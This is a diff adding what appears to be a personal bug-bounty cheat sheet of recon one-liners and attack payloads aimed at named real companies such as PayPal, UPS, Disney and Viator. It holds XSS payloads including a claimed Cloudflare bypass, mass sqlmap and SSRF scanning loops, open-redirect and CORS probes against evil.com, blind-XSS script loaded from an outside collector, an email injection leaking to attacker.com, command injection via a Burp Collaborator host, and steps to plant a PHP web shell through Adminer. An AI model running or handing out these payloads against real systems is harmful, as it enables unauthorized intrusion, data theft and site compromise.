@@ -1,0 +1,336 @@
+Ssl.Cert.Subject.CN.*.google.com
+ssl:"paypal"200
+org:"Amazon" ssl:"target"
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<script>console.log("xss")</script>
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+shodan search ssl[.]cert[.]subject[.]CN:"http://target[.]com*" 200 --fields ip_str | httpx | tee ips.txt 
+
+nuclei -l ips.txt -o vulns.txt
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+1. echo "harvard.edu"|assetfinder -subs-only |tee ast.txt
+2. echo "harvard.edu"|subfinder |tee sub.txt
+3. cat ast.txt sub.txt| sort -u >>subdomains.txt
+
+1. FOR NUCLEI: cat subdomains.txt| httpx| nuclei -t ~/nuclei-templates/ -es info |tee
+nucleiResult.txt
+2. For Manual Testing: cat subdomains.txt| httpx -title -status-code -content-length
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+waybackurls google.com > google.txt
+
+cat google.txt | grep =
+
+X-Forwarded-Host:bing.com"><img src/onerror=alert(1)>
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+XSS Payload To bypass CLoudflare:
+
+for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7
+
+javascript:{alert ‘0’ }
+
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+
+
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+"><fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+subfinder -d disney.com -silent -all | httpx -silent -threades 100 | nuclei -id CVE-2022-26138 -v
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+cat rootDomains.txt | waybackurls > wayback_urls_for_target.txt ; python3 sqli_detector wayback_urls_for_target.txt
+
+cat rootDomains.txt  | assetfinder -only-subs | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred"
+
+python3 sqlidetector.py -f urls.txt -w 50 -o output.txt -t 10 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+Oneliner XSS at scale 
+cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro  | dalfox pipe -b https://hackh1.xss.ht -o xss.txt
+
+------------------------------------------------------------------------------------------------------
+
+subfinder -d ups.com -silent | waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
+
+------------------------------------------------------------------------------------------------------
+
+-rate-limit 20 -concurrency 5 timeout 10
+
+
+123"><svg+onload=prompt(document.domain)>
+
+for i in $(waybackurls target.com);do
+python3 ssrf.py -H$i; done
+
+1) Find the Img  find the source page and check the path
+2) Check dir listing
+3) try encoding 
+..././ dir bypass
+
+inurl:/sym404/root
+
+
+ffuf -u http://connectnb.ups.com/FUZZ -w /home/Wordlist.txt -recursion -c -v -mc 200 -fs 0 -fw 0
+
+
+sudo dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -l /target.com/recon/httpx.txt -i 200 --full-url -b target.com
+
+
+title:grafana hostname:yahoo.com
+http.favicon.hash:2123863676 org:amazon
+
+cat file.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
+
+openredirct
+waybackurls testphp.vulnweb.com | grep -a -i \=http |qsreplace 'http://evil.com' | while read host do;do curl -s -L $host  -I|grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+
+for SSRF
+
+findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://c3f9emayedf0000wv8nggbzwzkryyyyyb.interact.sh
+
+
+LFI 
+
+findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w path of wordlist LFI.txt ; done
+
+
+Directory
+
+dotdotpwn -m http-url -u http://testphp.vulnweb.com/search.php?test=TRAVERSAL -k “root:”
+
+SQL
+Sqlmap command : 
+
+sqlmap -u example.com –dbs –random-agent –level=4 –risk=3
+
+ 
+
+Mass sql injection scanning command :
+
+httpx -l domains.txt -silent -threads 1000 | xargs -I@ sh -c ‘findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli –batch –random-agent –level 1’
+
+
+cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | sort -u ----- to find the php parameter ex. php=1
+
+docker run bpsizemore/redking -url http://3.7.123.45/adminer.php -mode portscan
+
+assetfinder, findomain, subfinder, amass, oneforall…dnsgen
+
+amass enum -d example.com
+$ amass enum -v -src -ip -brute -min-for-recursive 2 -share -d example.com
+
+Verifying live subdomains: httpx
+Verifying takeovers: subjack
+Clicking in all links
+Reviewing Javascript files
+Signing up
+Searching in archive.org
+Reviewing response headers (web cache poison)
+Reviewing postmessages
+
+ffuf -w /wordlists/raft-medium-directories.txt -c -fc 404 -u https://redacted.com/FUZZ/
+
+Ssl.cert.subject.CN:"facebook.com" 200
+cat paypal.com.txt | python3 smuggler.py
+
+Remove the dubbale ext
+
+cat file.txt | sed 's/<word-to-remove>$//'
+---------------------------------------------------------------------------------------------
+
+cat subdomin .txt | nuclei -t nuclei-templates
+
+nuclei -l domain.txt nuclei-templates
+
+nuclei -l target_urls.txt -t cves/
+
+nuclei -l urls.txt -t files/ -t tokens/ -t cves/ -pbar -c 100 -o output.txt 
+-l:-   List of URLs to run templates on 
+-t:-  Template input file/files to run on the host. Can be used multiple times. 
+-c:-  Number of concurrent requests. 
+-o:-  File to write output 
+-pbar:- Enable the progress bar.
+
+
+C:\Users\Sachin -----------path nuclei-templates
+
+gau -random-agent -b css,png,jpeg,jpg,svg,gif,ttf,woff,woff2,eot,otf,ico,js -subs example.com | sort -u >> results.txt
+-random-agent: use a random agent. 
+-b: extension to skip 
+-subs:  include subdomains of a target domain.
+
+
+cat hosts.txt | httpx -title -vhost -status-code
+
+
+dirsearch -u abc.com -e php,jsp
+
+cat domain.txt | xargs -I@ sh -c 'dirsearch -u @ -e php,js
+
+httpx -title -tech-detect -status-code -follow-redirects | tee output.txt
+
+httpx -l hosts.txt -path /sm/login/loginpagecontentgrabber.do -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200
+
+cat domains.txt | httprobe -p http:81 -p https:8443  --------for live 
+
+
+
+amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500
+
+amass enum -passive -d  manulife.com -src | tee amass.txt
+
+for CORS 
+assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
+
+
+./subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
+
+
+subzy domin.txt 
+
+sub dom
+
+live sub domain httpprob 
+subfinder -d hackerone.com | httpx -title -tech-detect -status-code -follow-redirects
+
+httpx -l subdomains.txt -o activesubs.txt -threads 200 -status-code -follow-redirects
+
+404 check for subtakeover 
+
+
+do site giithbu recon
+
+shown cyenssoe cehck site 
+
+
+acc.redbull.com
+
+broknlink check 
+
+abc.redbull.com  .js file check only .js 
+
+dirbuster / list midium 
+
+
+marge to file ---------- sort assetfinder-paypal.txt subfinder-paypal.txt | uniq > final.txt
+
+cat final.txt |httpx -threads 100 -o httpx-subdomain.txt
+
+subzy -targets http-elastic.txt
+
+gau hackerone.com -o gau-hackerone.txt
+
+cat hackerone-urld.txt | grep '\.js$'  > hackerone.txt
+
+amass enum -passive -d owasp.org -src
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Apache Struts S2-016
+
+httpx -l host.txt -path /sm/login/loginpagecontentgrabber.do -threads 100 -random-agent -x GET -title-tech-detect -status-code -follow-redirects -title -mc 200
+
+need to find /sm/login/loginpagecontentgrabber.do in the url
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+HTML Injection In email
+
+POST/passwordreset HTTP/1.1
+HOST: www.target.com
+User-Agent:Mozilla/5.0
+Content-Type:Application/x-www-form-urlencoded
+Content-Lenght:Number
+
+email=victim@gmail.com&parameter=<img src=\"http://attacker.com/?id=
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Open redirect
+
+site:target.com inurl:redir
+site:target.com inurl:redirect
+site:target.com inurl:return
+site:target.com inurl:src=http
+site:target.com inurl:r=http
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Os Command injection
+
+
+reset password with email
+email=test@'whoami`.id.burpcollab.net
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+WP - Dork 
+
+inurl:wp-content/plugins/jsmol2wp
+inurl:"/wp-content/plugins.jsmol2wp/php/jsmol.php?isfrom=true&call=getRawDataFromDatabase&query="
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+for i in $(waybackurls target.com);do
+python3 ssrf.py -H$i; done
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Scan default paths:
+1. /adminer
+2. /adminer.php
+3. /Adminer.php
+
+Login using SQLite driver and "1.db" database.
+
+Upload a shell:
+1. ATTACH DATABASE "./a.php" as a;
+2. CREATE TABLE a.a(a TEXT);
+3. INSERT INTO a.a(a) VALUES('<?php ..');
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ffuf -u https://target.com/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
+
+--------------------------------------------------------------------------------------------------------------
+
+
+subfinder -d viator.com -all  -recursive > subdomain.txt
+
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+
+cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+
+cat allurls.txt | grep -E "\.js$" >> js.txt
+
+cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 
+
+echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+
+dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+
+subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+
+python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
+
+nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+
+cat allurls.txt | gf lfi | nuclei -tags lfi
+cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+
+
+
